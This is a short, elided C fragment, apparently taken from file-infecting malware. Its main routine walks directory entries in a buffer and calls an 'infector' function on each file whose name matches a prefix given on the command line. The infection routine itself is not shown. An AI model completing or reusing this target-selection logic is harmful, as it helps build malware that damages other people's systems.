...
int main (int argc , char* argv[], char* envp[])
{
	...
	else if(prefixAddMode!=0)
        	prefix= &argv[prefixAddMode][2];
	char buf[8192];
	int fd;
	ent *entp=(ent*) (buf);
	...
	while(x<count){
		entp =(ent*) (buf+x);
		if(prefixAddMode!=0 && strncmp(prefix,entp->buff,strlen(prefix))==0){
                	infector(entp->buff);
        	}
		if((prefixAddMode==0 && prefixMode==0) || strncmp(prefix,entp->buff,strlen(prefix))==0){
